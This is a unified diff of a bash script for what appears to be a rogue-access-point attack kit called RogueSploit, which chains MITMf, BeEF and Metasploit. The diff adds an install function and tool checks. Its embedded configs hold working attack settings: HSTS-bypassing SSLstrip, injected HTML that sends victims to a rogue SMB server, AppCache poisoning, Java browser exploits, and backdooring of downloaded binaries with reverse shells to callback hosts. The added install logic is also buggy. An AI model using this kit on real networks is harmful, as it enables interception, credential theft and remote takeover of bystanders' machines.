@@ -23,16 +23,46 @@ white='\e[1;37m'
 red='\e[1;31m'
 yellow='\e[1;33m'
 blue='\e[1;34m'
+transparent='\e[0m'
 
 #DEBUG ONLY FOR LOGGIN, BREAK CTRL_C TRAP!!!#
-#ENABLE FOR IF YOU GET ERRORS; DO THE SAME FOR BEEFSTARTER SCRIPT AND OTHERS SCRIPTS TOO (not the .rc) 
+#ENABLE IF YOU GET ERRORS; DO THE SAME FOR BEEFSTARTER SCRIPT AND OTHERS SCRIPTS TOO (not the .rc)
 #DATE=$(date)
 #echo $DATE
-#LOG_FILE=$PWD/beef.log
+#LOG_FILE=$PWD/roguesploit.log
 #exec > >(tee -a ${LOG_FILE} )
 #exec 2> >(tee -a ${LOG_FILE} >&2)
-#echo $DATE > $PWD/beef.log
+#echo $DATE > $PWD/roguesploit.log
+#echo -e $white"Logging Enabled, "$yellow"CTRL"$white"+"$red"C"$white" will not work!!"$transparent
+#sleep 1
 
+#Correct Mitmf installation
+mitmf_install () {
+	echo -ne $blue"["$yellow"?"$blue"] "$yellow"Do you want to correctly install MITMF? (y/n)"$blue"["$yellow"*"$blue"]";
+	echo -ne $yellow"mitmf"$white"@"$red"install"$white"; read mitans
+	if [ $mitans != 'n' ] || [ $mitans != 'N' ] || [ $mitans != 'No' ]
+		then
+    mitmfconf = "/root/MITMf/config/mitmf.conf"
+		apt-get remove mitmf
+		apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
+		cd $HOME && git clone https://github.com/byt3bl33d3r/MITMf
+		cd $HOME/MITMf && git submodule init && git submodule update --recursive
+		cd $HOME/MITMf && pip install -r requirements.txt
+		cat << "EOF" > /usr/bin/mitmf
+#!/bin/bash
+cd $HOME/MITMf/ && sudo python mitmf.py "$@"
+EOF
+		chmod 777 /usr/bin/mitmf
+		sudo pip uninstall Twisted
+		sudo pip install Twisted==15.5.0
+		sleep 0.8
+		cd $HOME/RogueSploit
+		echo -e $lightgreen"[*] DONE [*]"
+		sleep 3
+  else
+    mitmfconf = "/etc/mitmf/mitmf.conf"
+	fi
+}
 
 #Exit application
 trap ctrl_c INT
@@ -309,7 +339,7 @@ EOF
 #
 
 [Replace]
-	
+
 	[[Regex1]]
 		'Google Search' = 'Google yssas'
 
@@ -324,7 +354,7 @@ EOF
 	#Client = '192.168.1.26'
 
 [SSLstrip+]
-	
+
 	#
 	#Here you can configure your domains to bypass HSTS on, the format is real.domain.com = fake.domain.com
 	#
@@ -390,7 +420,7 @@ EOF
 
 		#Custom WPAD Script
 		WPADScript = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}'
-		
+
 		#HTML answer to inject in HTTP responses (before </body> tag).
 		#Set to an empty string to disable.
 		#In this example, we redirect make users' browsers issue a request to our rogue SMB server.
@@ -406,7 +436,7 @@ EOF
 	# HTML5 AppCache poisioning attack
 	# see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html for description of the attack.
 	# generic settings for tampering engine
-	
+
 	#enable_only_in_useragents=Chrome|Firefox
 
 	templates_path=config/app_cache_poison_templates
@@ -415,7 +445,7 @@ EOF
 	#(to poison the cache for all of them all at once)
 
 	mass_poison_url_match=http://.*prezydent\.pl.*
-	
+
 	# it's only useful to mass poison chrome because:
 	# - it supports iframe sandbox preventing framebusting
 	# - does not ask for confirmation
@@ -424,7 +454,7 @@ EOF
 
 	[[test]]
 		# any //example.com URL redirects to iana and will display our spoofed content
-		
+
 		tamper_url=http://example.com/
 		manifest_url=http://www.iana.org/robots.txt #use existing static URL that is rarely seen by the browser user, but exists on the server (no 404!)
 		templates=test # which templates to use for spoofing content?
@@ -468,13 +498,13 @@ EOF
 	#
 	# When adding java exploits remember the following format: version string (eg 1.6.0) + update version (eg 28) = 1.6.0.28
 	#
-	
+
 	msfport = 8080    # Port to start Metasploit's webserver which will host the exploits
 
 	[[exploits]]
 
 		[[[multi/browser/java_rhino]]] #Exploit's MSF path
-			
+
 			Type = PluginVuln  #Can be set to PluginVuln, BrowserVuln
 			OS   = Any         #Can be set to Any, Windows or Windows + version (e.g Windows 8.1)
 
@@ -493,13 +523,13 @@ EOF
 			PluginVersions = 1.5.0, 1.5.0.1, 1.5.0.10, 1.5.0.11, 1.5.0.12, 1.5.0.13, 1.5.0.14, 1.5.0.15, 1.5.0.16, 1.5.0.17, 1.5.0.18, 1.5.0.19, 1.5.0.2, 1.5.0.20, 1.5.0.21, 1.5.0.22, 1.5.0.23, 1.5.0.24, 1.5.0.25, 1.5.0.26, 1.5.0.27, 1.5.0.28, 1.5.0.29, 1.5.0.3, 1.5.0.31, 1.5.0.33, 1.5.0.4, 1.5.0.5, 1.5.0.6, 1.5.0.7, 1.5.0.8, 1.5.0.9, 1.6.0, 1.6.0.1, 1.6.0.10, 1.6.0.11, 1.6.0.12, 1.6.0.13, 1.6.0.14, 1.6.0.15, 1.6.0.16, 1.6.0.17, 1.6.0.18, 1.6.0.19, 1.6.0.2, 1.6.0.20, 1.6.0.21, 1.6.0.22, 1.6.0.24, 1.6.0.25, 1.6.0.26, 1.6.0.27, 1.6.0.29, 1.6.0.3, 1.6.0.30, 1.6.0.4, 1.6.0.5, 1.6.0.6, 1.6.0.7, 1.7.0, 1.7.0.1, 1.7.0.2
 
 		[[[multi/browser/java_jre17_jmxbean_2]]]
-			
+
 			Type    = PluginVuln
 			OS      = Any
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_jre17_reflection_types]]]
 
 			Type    = PluginVuln
@@ -507,7 +537,7 @@ EOF
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.13, 1.7.0.15, 1.7.0.17, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_verifier_field_access]]]
 
 			Type    = PluginVuln
@@ -566,9 +596,9 @@ EOF
 
 [FilePwn]
 
-	# 
+	#
 	#   Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-	#	
+	#
 	#	Copyright (c) 2013-2014, Joshua Pitts
 	#	All rights reserved.
 	#
@@ -600,7 +630,7 @@ EOF
 	#
 
 	[[hosts]]
-	#whitelist host/IP - patch these only. 
+	#whitelist host/IP - patch these only.
 	#ALL is everything, use the blacklist to leave certain hosts/IPs out
 
 	whitelist = ALL
@@ -624,7 +654,7 @@ EOF
 
 	[[ZIP]]
 	# patchCount is the max number of files to patch in a zip file
-	# After the max is reached it will bypass the rest of the files 
+	# After the max is reached it will bypass the rest of the files
 	# and send on it's way
 
 	patchCount = 5
@@ -649,13 +679,13 @@ EOF
 	[[targets]]
 		#MAKE SURE that your settings for host and port DO NOT
 		# overlap between different types of payloads
-		
+
 		[[[ALL]]] # DEFAULT settings for all targets REQUIRED
-		
+
 		LinuxType = ALL 	# choices: x86/x64/ALL/None
 		WindowsType = ALL 	# choices: x86/x64/ALL/None
 		FatPriority = x86   # choices: x86 or x64
-		
+
 		FileSizeMax = 10000000  # ~10 MB (just under) No patching of files this large
 
 		CompressedFiles = True #True/False
@@ -665,7 +695,7 @@ EOF
 			PORT = 8888
 			SUPPLIED_SHELLCODE = None
 			MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
-			
+
 			[[[[LinuxIntelx64]]]]
 			SHELL = reverse_shell_tcp
 			HOST = 192.168.0.4
@@ -730,7 +760,7 @@ EOF
 
 		# Call out the difference for targets here as they differ from ALL
 		# These settings override the ALL settings
-		
+
 		[[[sysinternals.com]]]
 		LinuxType = None
 		WindowsType = ALL
@@ -777,7 +807,55 @@ sleep 2
 clear
 exit
 }
+#tools installation checks
+function checktools {
+  echo ""
+	echo -ne $white"Checking Metasploit....."$transparent
+	if ! hash msfconsole 2>/dev/null; then
+		echo -e $red"Not installed"$transparent
+		exit
+	else
+		echo -e $lightgreen"OK!"$transparent
+	fi
+	sleep 0.5
 
+  echo -ne $white"Checking Hostapd....."$transparent
+	if ! hash hostapd 2>/dev/null; then
+		echo -e $red"Not installed"$transparent
+		exit
+	else
+		echo -e $lightgreen"OK!"$transparent
+	fi
+	sleep 0.5
+
+  echo -ne $white"Checking DHCPD Server....."$transparent
+	if ! hash dhcpd 2>/dev/null; then
+		echo -e $red"Not installed"$transparent
+		exit
+	else
+		echo -e $lightgreen"OK!"$transparent
+	fi
+	sleep 0.5
+
+  echo -ne $white"Checking Python....."$transparent
+  if ! hash python 2>/dev/null; then
+    echo -e $red"Not installed"$transparent
+    exit
+  else
+    echo -e $lightgreen"OK!"$transparent
+  fi
+  sleep 0.5
+
+  echo -ne $white"Checking Beef....."$transparent
+	if ! hash beef-xss 2>/dev/null; then
+		echo -e $red"Not installed"$transparent
+		exit
+	else
+		echo -e $lightgreen"OK!"$transparent
+	fi
+	sleep 0.5
+
+}
 #Welcome Screen
 welcome () {
 myname=$(zenity --entry --title="[*] ROGUESPLOIT [*]" --text=" Input your name or nick :D ");
@@ -1033,7 +1111,7 @@ beef:
             autopwn_url: "autopwn"
             auto_msfrpcd: false
             auto_msfrpcd_timeout: 120
-            msf_path: [ 
+            msf_path: [
               {os: 'osx', path: '/opt/local/msf/'},
               {os: 'livecd', path: '/opt/metasploit-framework/'},
               {os: 'bt5r3', path: '/opt/metasploit/msf3/'},
@@ -1048,7 +1126,7 @@ EOF
 	sleep 0.6
 	echo -e $blue"["$yellow"*"$blue"]"$white" Changing MITMF's configuration for RogueSploit! "$blue"["$yellow"*"$blue"]"
 	cp /etc/mitmf/mitmf.conf /etc/mitmf/mitmf.conf.reset
-	cat << "EOF" > /etc/mitmf/mitmf.conf
+	cat << "EOF" > mitmfconf
 # MITMf configuration file
 #
 
@@ -1127,7 +1205,7 @@ EOF
 #
 
 [Replace]
-	
+
 	[[Regex1]]
 		'Google Search' = 'RogueSploit Search'
 
@@ -1142,7 +1220,7 @@ EOF
 	#Client = '192.168.1.26'
 
 [SSLstrip+]
-	
+
 	#
 	#Here you can configure your domains to bypass HSTS on, the format is real.domain.com = fake.domain.com
 	#
@@ -1208,7 +1286,7 @@ EOF
 
 		#Custom WPAD Script
 		WPADScript = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}'
-		
+
 		#HTML answer to inject in HTTP responses (before </body> tag).
 		#Set to an empty string to disable.
 		#In this example, we redirect make users' browsers issue a request to our rogue SMB server.
@@ -1224,7 +1302,7 @@ EOF
 	# HTML5 AppCache poisioning attack
 	# see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html for description of the attack.
 	# generic settings for tampering engine
-	
+
 	#enable_only_in_useragents=Chrome|Firefox
 
 	templates_path=config/app_cache_poison_templates
@@ -1233,7 +1311,7 @@ EOF
 	#(to poison the cache for all of them all at once)
 
 	mass_poison_url_match=http://.*prezydent\.pl.*
-	
+
 	# it's only useful to mass poison chrome because:
 	# - it supports iframe sandbox preventing framebusting
 	# - does not ask for confirmation
@@ -1242,7 +1320,7 @@ EOF
 
 	[[test]]
 		# any //example.com URL redirects to iana and will display our spoofed content
-		
+
 		tamper_url=http://example.com/
 		manifest_url=http://www.iana.org/robots.txt #use existing static URL that is rarely seen by the browser user, but exists on the server (no 404!)
 		templates=test # which templates to use for spoofing content?
@@ -1286,13 +1364,13 @@ EOF
 	#
 	# When adding java exploits remember the following format: version string (eg 1.6.0) + update version (eg 28) = 1.6.0.28
 	#
-	
+
 	msfport = 8082    # Port to start Metasploit's webserver which will host the exploits
 
 	[[exploits]]
 
 		[[[multi/browser/java_rhino]]] #Exploit's MSF path
-			
+
 			Type = PluginVuln  #Can be set to PluginVuln, BrowserVuln
 			OS   = Any         #Can be set to Any, Windows or Windows + version (e.g Windows 8.1)
 
@@ -1311,13 +1389,13 @@ EOF
 			PluginVersions = 1.5.0, 1.5.0.1, 1.5.0.10, 1.5.0.11, 1.5.0.12, 1.5.0.13, 1.5.0.14, 1.5.0.15, 1.5.0.16, 1.5.0.17, 1.5.0.18, 1.5.0.19, 1.5.0.2, 1.5.0.20, 1.5.0.21, 1.5.0.22, 1.5.0.23, 1.5.0.24, 1.5.0.25, 1.5.0.26, 1.5.0.27, 1.5.0.28, 1.5.0.29, 1.5.0.3, 1.5.0.31, 1.5.0.33, 1.5.0.4, 1.5.0.5, 1.5.0.6, 1.5.0.7, 1.5.0.8, 1.5.0.9, 1.6.0, 1.6.0.1, 1.6.0.10, 1.6.0.11, 1.6.0.12, 1.6.0.13, 1.6.0.14, 1.6.0.15, 1.6.0.16, 1.6.0.17, 1.6.0.18, 1.6.0.19, 1.6.0.2, 1.6.0.20, 1.6.0.21, 1.6.0.22, 1.6.0.24, 1.6.0.25, 1.6.0.26, 1.6.0.27, 1.6.0.29, 1.6.0.3, 1.6.0.30, 1.6.0.4, 1.6.0.5, 1.6.0.6, 1.6.0.7, 1.7.0, 1.7.0.1, 1.7.0.2
 
 		[[[multi/browser/java_jre17_jmxbean_2]]]
-			
+
 			Type    = PluginVuln
 			OS      = Any
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_jre17_reflection_types]]]
 
 			Type    = PluginVuln
@@ -1325,7 +1403,7 @@ EOF
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.13, 1.7.0.15, 1.7.0.17, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_verifier_field_access]]]
 
 			Type    = PluginVuln
@@ -1384,9 +1462,9 @@ EOF
 
 [FilePwn]
 
-	# 
+	#
 	#   Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-	#	
+	#
 	#	Copyright (c) 2013-2014, Joshua Pitts
 	#	All rights reserved.
 	#
@@ -1418,7 +1496,7 @@ EOF
 	#
 
 	[[hosts]]
-	#whitelist host/IP - patch these only. 
+	#whitelist host/IP - patch these only.
 	#ALL is everything, use the blacklist to leave certain hosts/IPs out
 
 	whitelist = ALL
@@ -1442,7 +1520,7 @@ EOF
 
 	[[ZIP]]
 	# patchCount is the max number of files to patch in a zip file
-	# After the max is reached it will bypass the rest of the files 
+	# After the max is reached it will bypass the rest of the files
 	# and send on it's way
 
 	patchCount = 5
@@ -1467,13 +1545,13 @@ EOF
 	[[targets]]
 		#MAKE SURE that your settings for host and port DO NOT
 		# overlap between different types of payloads
-		
+
 		[[[ALL]]] # DEFAULT settings for all targets REQUIRED
-		
+
 		LinuxType = ALL 	# choices: x86/x64/ALL/None
 		WindowsType = ALL 	# choices: x86/x64/ALL/None
 		FatPriority = x86   # choices: x86 or x64
-		
+
 		FileSizeMax = 10000000  # ~10 MB (just under) No patching of files this large
 
 		CompressedFiles = True #True/False
@@ -1483,7 +1561,7 @@ EOF
 			PORT = 8888
 			SUPPLIED_SHELLCODE = None
 			MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
-			
+
 			[[[[LinuxIntelx64]]]]
 			SHELL = reverse_shell_tcp
 			HOST = 10.0.0.1
@@ -1548,7 +1626,7 @@ EOF
 
 		# Call out the difference for targets here as they differ from ALL
 		# These settings override the ALL settings
-		
+
 		[[[sysinternals.com]]]
 		LinuxType = None
 		WindowsType = ALL
@@ -1615,17 +1693,17 @@ iptables -F
 #Rogue ON
 rogueon () {
 cat << "EOF"
-8888888b.                                                        888          d8b 888           .d88888b.  888b    888 
-888   Y88b                                                       888          Y8P 888          d88P" "Y88b 8888b   888 
-888    888                                                       888              888          888     888 88888b  888 
-888   d88P  .d88b.   .d88b.  888  888  .d88b.  .d8888b  88888b.  888  .d88b.  888 888888       888     888 888Y88b 888 
-8888888P"  d88""88b d88P"88b 888  888 d8P  Y8b 88K      888 "88b 888 d88""88b 888 888          888     888 888 Y88b888 
-888 T88b   888  888 888  888 888  888 88888888 "Y8888b. 888  888 888 888  888 888 888          888     888 888  Y88888 
-888  T88b  Y88..88P Y88b 888 Y88b 888 Y8b.          X88 888 d88P 888 Y88..88P 888 Y88b.        Y88b. .d88P 888   Y8888 
-888   T88b  "Y88P"   "Y88888  "Y88888  "Y8888   88888P' 88888P"  888  "Y88P"  888  "Y888        "Y88888P"  888    Y888 
-                         888                            888                                                            
-                    Y8b d88P                            888                                                            
-                     "Y88P"                             888                                                            
+8888888b.                                                        888          d8b 888           .d88888b.  888b    888
+888   Y88b                                                       888          Y8P 888          d88P" "Y88b 8888b   888
+888    888                                                       888              888          888     888 88888b  888
+888   d88P  .d88b.   .d88b.  888  888  .d88b.  .d8888b  88888b.  888  .d88b.  888 888888       888     888 888Y88b 888
+8888888P"  d88""88b d88P"88b 888  888 d8P  Y8b 88K      888 "88b 888 d88""88b 888 888          888     888 888 Y88b888
+888 T88b   888  888 888  888 888  888 88888888 "Y8888b. 888  888 888 888  888 888 888          888     888 888  Y88888
+888  T88b  Y88..88P Y88b 888 Y88b 888 Y8b.          X88 888 d88P 888 Y88..88P 888 Y88b.        Y88b. .d88P 888   Y8888
+888   T88b  "Y88P"   "Y88888  "Y88888  "Y8888   88888P' 88888P"  888  "Y88P"  888  "Y888        "Y88888P"  888    Y888
+                         888                            888
+                    Y8b d88P                            888
+                     "Y88P"                             888
 EOF
 }
 
@@ -1656,7 +1734,7 @@ minimenu () {
 		beefinject
 		clear
 		menu
-	else 
+	else
 		echo -e $red"[!]  Incorrect Number  [!]"
 		echo -n -e $yellow"  Do you want exit? ( Yes / No ) :"
 		read back
@@ -1673,32 +1751,6 @@ minimenu () {
 		fi
 	fi
 }
-
-#Correct Mitmf installation
-mitmf_install () {
-	echo -ne $blue"["$yellow"?"$blue"] "$yellow"Do you want to correctly install MITMF? (y/n)"$blue"["$yellow"*"$blue"]\n\n";
-	echo -ne $yellow"mitmf"$white"@"$red"install"$white"# "; read mitans
-	if [ $mitans != 'n' ] && [ $mitans != 'N' ] && [ $mitans != 'No' ]
-		then
-		apt-get remove mitmf
-		apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
-		cd $HOME && git clone https://github.com/byt3bl33d3r/MITMf
-		cd $HOME/MITMf && git submodule init && git submodule update --recursive
-		cd $HOME/MITMf && pip install -r requirements.txt
-		cat << "EOF" > /usr/bin/mitmf
-#!/bin/bash
-cd $HOME/MITMf/ && sudo python mitmf.py "$@"
-EOF
-		chmod 777 /usr/bin/mitmf
-		sudo pip uninstall Twisted
-		sudo pip install Twisted==15.5.0
-		sleep 0.8
-		cd $HOME/RogueSploit
-		echo -e $lightgreen"[*] DONE [*]"
-		sleep 3
-	fi
-}
-
 
 
 
@@ -1723,7 +1775,7 @@ if test $answer1 == '1'
 	pkill dhcpd
 	pkill dns*
 	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]\n";
-	echo -ne $red"["$yellow"$myname"$red"@"$yellow"fakeap"$red"]"$white": "$red"("$white" Ex. AndroidAP"$red" ) "; 
+	echo -ne $red"["$yellow"$myname"$red"@"$yellow"fakeap"$red"]"$white": "$red"("$white" Ex. AndroidAP"$red" ) ";
 	read nameap
 	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
@@ -2027,7 +2079,7 @@ EOF
 #
 
 [Replace]
-	
+
 	[[Regex1]]
 		'Google Search' = 'Google yssas'
 
@@ -2042,7 +2094,7 @@ EOF
 	#Client = '192.168.1.26'
 
 [SSLstrip+]
-	
+
 	#
 	#Here you can configure your domains to bypass HSTS on, the format is real.domain.com = fake.domain.com
 	#
@@ -2108,7 +2160,7 @@ EOF
 
 		#Custom WPAD Script
 		WPADScript = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}'
-		
+
 		#HTML answer to inject in HTTP responses (before </body> tag).
 		#Set to an empty string to disable.
 		#In this example, we redirect make users' browsers issue a request to our rogue SMB server.
@@ -2124,7 +2176,7 @@ EOF
 	# HTML5 AppCache poisioning attack
 	# see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html for description of the attack.
 	# generic settings for tampering engine
-	
+
 	#enable_only_in_useragents=Chrome|Firefox
 
 	templates_path=config/app_cache_poison_templates
@@ -2133,7 +2185,7 @@ EOF
 	#(to poison the cache for all of them all at once)
 
 	mass_poison_url_match=http://.*prezydent\.pl.*
-	
+
 	# it's only useful to mass poison chrome because:
 	# - it supports iframe sandbox preventing framebusting
 	# - does not ask for confirmation
@@ -2142,7 +2194,7 @@ EOF
 
 	[[test]]
 		# any //example.com URL redirects to iana and will display our spoofed content
-		
+
 		tamper_url=http://example.com/
 		manifest_url=http://www.iana.org/robots.txt #use existing static URL that is rarely seen by the browser user, but exists on the server (no 404!)
 		templates=test # which templates to use for spoofing content?
@@ -2186,13 +2238,13 @@ EOF
 	#
 	# When adding java exploits remember the following format: version string (eg 1.6.0) + update version (eg 28) = 1.6.0.28
 	#
-	
+
 	msfport = 8080    # Port to start Metasploit's webserver which will host the exploits
 
 	[[exploits]]
 
 		[[[multi/browser/java_rhino]]] #Exploit's MSF path
-			
+
 			Type = PluginVuln  #Can be set to PluginVuln, BrowserVuln
 			OS   = Any         #Can be set to Any, Windows or Windows + version (e.g Windows 8.1)
 
@@ -2211,13 +2263,13 @@ EOF
 			PluginVersions = 1.5.0, 1.5.0.1, 1.5.0.10, 1.5.0.11, 1.5.0.12, 1.5.0.13, 1.5.0.14, 1.5.0.15, 1.5.0.16, 1.5.0.17, 1.5.0.18, 1.5.0.19, 1.5.0.2, 1.5.0.20, 1.5.0.21, 1.5.0.22, 1.5.0.23, 1.5.0.24, 1.5.0.25, 1.5.0.26, 1.5.0.27, 1.5.0.28, 1.5.0.29, 1.5.0.3, 1.5.0.31, 1.5.0.33, 1.5.0.4, 1.5.0.5, 1.5.0.6, 1.5.0.7, 1.5.0.8, 1.5.0.9, 1.6.0, 1.6.0.1, 1.6.0.10, 1.6.0.11, 1.6.0.12, 1.6.0.13, 1.6.0.14, 1.6.0.15, 1.6.0.16, 1.6.0.17, 1.6.0.18, 1.6.0.19, 1.6.0.2, 1.6.0.20, 1.6.0.21, 1.6.0.22, 1.6.0.24, 1.6.0.25, 1.6.0.26, 1.6.0.27, 1.6.0.29, 1.6.0.3, 1.6.0.30, 1.6.0.4, 1.6.0.5, 1.6.0.6, 1.6.0.7, 1.7.0, 1.7.0.1, 1.7.0.2
 
 		[[[multi/browser/java_jre17_jmxbean_2]]]
-			
+
 			Type    = PluginVuln
 			OS      = Any
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_jre17_reflection_types]]]
 
 			Type    = PluginVuln
@@ -2225,7 +2277,7 @@ EOF
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.13, 1.7.0.15, 1.7.0.17, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_verifier_field_access]]]
 
 			Type    = PluginVuln
@@ -2284,9 +2336,9 @@ EOF
 
 [FilePwn]
 
-	# 
+	#
 	#   Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-	#	
+	#
 	#	Copyright (c) 2013-2014, Joshua Pitts
 	#	All rights reserved.
 	#
@@ -2318,7 +2370,7 @@ EOF
 	#
 
 	[[hosts]]
-	#whitelist host/IP - patch these only. 
+	#whitelist host/IP - patch these only.
 	#ALL is everything, use the blacklist to leave certain hosts/IPs out
 
 	whitelist = ALL
@@ -2342,7 +2394,7 @@ EOF
 
 	[[ZIP]]
 	# patchCount is the max number of files to patch in a zip file
-	# After the max is reached it will bypass the rest of the files 
+	# After the max is reached it will bypass the rest of the files
 	# and send on it's way
 
 	patchCount = 5
@@ -2367,13 +2419,13 @@ EOF
 	[[targets]]
 		#MAKE SURE that your settings for host and port DO NOT
 		# overlap between different types of payloads
-		
+
 		[[[ALL]]] # DEFAULT settings for all targets REQUIRED
-		
+
 		LinuxType = ALL 	# choices: x86/x64/ALL/None
 		WindowsType = ALL 	# choices: x86/x64/ALL/None
 		FatPriority = x86   # choices: x86 or x64
-		
+
 		FileSizeMax = 10000000  # ~10 MB (just under) No patching of files this large
 
 		CompressedFiles = True #True/False
@@ -2383,7 +2435,7 @@ EOF
 			PORT = 8888
 			SUPPLIED_SHELLCODE = None
 			MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
-			
+
 			[[[[LinuxIntelx64]]]]
 			SHELL = reverse_shell_tcp
 			HOST = 192.168.0.4
@@ -2448,7 +2500,7 @@ EOF
 
 		# Call out the difference for targets here as they differ from ALL
 		# These settings override the ALL settings
-		
+
 		[[[sysinternals.com]]]
 		LinuxType = None
 		WindowsType = ALL
@@ -2833,7 +2885,7 @@ EOF
 #
 
 [Replace]
-	
+
 	[[Regex1]]
 		'Google Search' = 'Google yssas'
 
@@ -2848,7 +2900,7 @@ EOF
 	#Client = '192.168.1.26'
 
 [SSLstrip+]
-	
+
 	#
 	#Here you can configure your domains to bypass HSTS on, the format is real.domain.com = fake.domain.com
 	#
@@ -2914,7 +2966,7 @@ EOF
 
 		#Custom WPAD Script
 		WPADScript = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}'
-		
+
 		#HTML answer to inject in HTTP responses (before </body> tag).
 		#Set to an empty string to disable.
 		#In this example, we redirect make users' browsers issue a request to our rogue SMB server.
@@ -2930,7 +2982,7 @@ EOF
 	# HTML5 AppCache poisioning attack
 	# see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html for description of the attack.
 	# generic settings for tampering engine
-	
+
 	#enable_only_in_useragents=Chrome|Firefox
 
 	templates_path=config/app_cache_poison_templates
@@ -2939,7 +2991,7 @@ EOF
 	#(to poison the cache for all of them all at once)
 
 	mass_poison_url_match=http://.*prezydent\.pl.*
-	
+
 	# it's only useful to mass poison chrome because:
 	# - it supports iframe sandbox preventing framebusting
 	# - does not ask for confirmation
@@ -2948,7 +3000,7 @@ EOF
 
 	[[test]]
 		# any //example.com URL redirects to iana and will display our spoofed content
-		
+
 		tamper_url=http://example.com/
 		manifest_url=http://www.iana.org/robots.txt #use existing static URL that is rarely seen by the browser user, but exists on the server (no 404!)
 		templates=test # which templates to use for spoofing content?
@@ -2992,13 +3044,13 @@ EOF
 	#
 	# When adding java exploits remember the following format: version string (eg 1.6.0) + update version (eg 28) = 1.6.0.28
 	#
-	
+
 	msfport = 8080    # Port to start Metasploit's webserver which will host the exploits
 
 	[[exploits]]
 
 		[[[multi/browser/java_rhino]]] #Exploit's MSF path
-			
+
 			Type = PluginVuln  #Can be set to PluginVuln, BrowserVuln
 			OS   = Any         #Can be set to Any, Windows or Windows + version (e.g Windows 8.1)
 
@@ -3017,13 +3069,13 @@ EOF
